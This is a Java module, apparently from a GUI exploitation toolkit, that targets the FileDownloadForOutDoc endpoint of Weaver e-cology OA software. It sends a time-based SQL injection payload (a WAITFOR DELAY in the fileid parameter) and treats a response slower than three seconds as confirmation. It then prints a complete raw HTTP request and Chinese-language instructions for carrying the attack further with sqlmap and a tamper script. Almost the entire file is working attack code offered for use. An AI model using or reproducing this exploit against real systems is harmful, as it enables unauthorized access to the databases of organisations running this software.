package exp.oa.weaveroa.ecology;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class weaver_ec_FileDownloadForOutDoc_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            String data = "fileid=123+WAITFOR+DELAY+'0:0:3'&isFromOutImg=1";
            long var = HttpTools_getTime.post(url + "/weaver/weaver.file.FileDownloadForOutDoc" ,data, head, "utf-8");
            if (var>3000) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ weaver_ec_FileDownloadForOutDoc_sqli ]");
                    textArea.appendText("\n 将weaver_ec_FileDownloadForOutDoc_sqli_tamper.py文件放入tamper模块下");
                    textArea.appendText("\n 复制文本内容为target.req文件，并利用sqlmap模块进行利用");
                    textArea.appendText("\n");
                });

                String target_req = "POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36\n" +
                        "Content-Length: 45\n" +
                        "Content-Type: application/x-www-form-urlencoded\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Connection: close\n" +
                        "\n" +
                        "fileid=123+WAITFOR+DELAY+'0:0:3'&isFromOutImg=1";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
